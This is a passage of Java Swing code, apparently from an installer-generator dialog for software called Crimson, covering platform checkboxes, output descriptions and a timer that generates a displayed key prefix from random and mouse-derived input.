		cbx_allow_and.setSelected(false);
		cbx_allow_and.setEnabled(false);
		cbx_allow_bsd.setSelected(false);
		cbx_allow_bsd.setEnabled(false);
		fld_install_bsd.setEnabled(false);
		cbx_allow_lin.setSelected(false);
		cbx_allow_lin.setEnabled(false);
		cbx_allow_osx.setSelected(false);
		cbx_allow_osx.setEnabled(false);
		cbx_allow_sol.setSelected(false);
		cbx_allow_sol.setEnabled(false);
		cbx_allow_win.setSelected(true);
		cbx_allow_win.setEnabled(true);
	}

	private void changeToApk() {

		txt_output_desc.setText("An Android installer can install Crimson on Android devices version 2.2 and up.");

	}

	private void changeToSh() {

		txt_output_desc.setText("");

	}

	private void refreshAuth() {
		String c = (String) authType.getSelectedItem();

	}

	class GroupTimer extends TimerTask {

		private Random rand = new Random();
		private String last = "" + new Date().getTime();

		private int upper = 20;
		private int lower = 10;

		@Override
		public void run() {
			hash();
			display(50);
		}

		private void hash() {
			last = Crypto.sign(last, CUtil.Misc.randString(rand.nextInt(upper - lower + 1) + lower)).replaceAll("\\+|/",
					CUtil.Misc.randString(1));
		}

		private void display(int delay) {
			String data = last;
			StringBuffer sb = new StringBuffer();
			for (int i = 0; i < 16; i++) {
				sb.append(' ');
				sb.append(data.charAt(i));
			}
			key_prefix.setText("");
			try {
				Thread.sleep(delay);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			key_prefix.setText(sb.toString().substring(1).toUpperCase());
		}

		public void mix(Point p) {
			last += p.x + p.y;
			hash();
			display(0);
		}

	}

	public void cancelTimer() {
		timer.cancel();
		timer = null;

	}
}
